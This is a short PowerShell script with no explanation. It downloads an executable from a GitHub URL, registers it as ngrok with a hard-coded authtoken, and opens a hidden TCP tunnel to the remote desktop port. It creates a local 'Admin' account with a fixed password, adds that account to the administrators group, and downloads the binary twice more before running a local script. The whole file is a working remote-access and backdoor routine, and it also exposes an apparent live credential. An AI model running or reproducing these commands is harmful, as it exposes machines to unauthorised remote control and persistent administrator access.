Invoke-WebRequest -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/dinowo/main/use.exe" -OutFile ngrok.exe 
cmd /c ngrok.exe authtoken 2flX2UiFtcfDHTJ6gRNRnE2J44j_3EbFaYe88nAbW2rSwgb1Y
Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
cmd /c net user /add Admin P@ssw0rd.
cmd /c net localgroup /add administrators Admin
sleep 240
curl -o zip.exe -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/dinowo/main/use.exe"
.\0.ps1
curl -o zip.exe -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/dinowo/main/use.exe"
.\0.ps1
